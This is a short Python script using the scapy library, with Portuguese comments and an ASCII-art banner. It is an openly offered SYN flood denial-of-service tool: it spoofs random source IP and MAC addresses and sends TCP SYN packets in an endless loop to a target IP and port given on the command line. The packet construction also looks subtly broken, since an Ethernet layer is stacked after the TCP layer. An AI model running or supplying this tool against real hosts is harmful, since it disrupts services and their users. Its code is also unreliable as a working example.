import sys
from os import system
from scapy.all import *
from random import randint
#by Mhracos Nesster [Mh4]
#Syn flood com scapy python 
# spoof MAC and IP
# simples e facil  
class synflood:
	global target,porta
	def run(self,target,porta):
		ip = IP()
		# spoof IP com randint 
		ip.src = "%i.%i.%i.%i" % (randint(1,254),randint(1,254),randint(1,254),randint(1,254))
		# IP targe
		ip.dst = target
		tcp = TCP()
		# range porta
		tcp.sport = randint(1,65535)
		#porta flood
		tcp.dport = porta
		# SYN flood ataque
		tcp.flags = "S"
		#compilando packet
		send(ip/tcp/Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff"), loop=1, verbose=1)
def main():
	if len(sys.argv) != 3:
		print("""                 ,  ,
                     \:.|`._
                  /\/;.:':::;;;._
                 <  .'     ':::;(
                  < ' _      '::;>
                   \ (9)  _  :::;(
                   |     / \  \:;`>
                   |    /  |  //:;(
                   |   (  <=-  .::;>
                   (  a) )=-  .::;( Mh4
                    '-' <=- _.::;>
""")
		print "Usage: %s <Target IP> <Port> " % sys.argv[0]
		sys.exit(1)
	target = sys.argv[1]
	porta = int(sys.argv[2])
	start =synflood()
	start.run(target,porta)
if __name__ == "__main__":
	main()
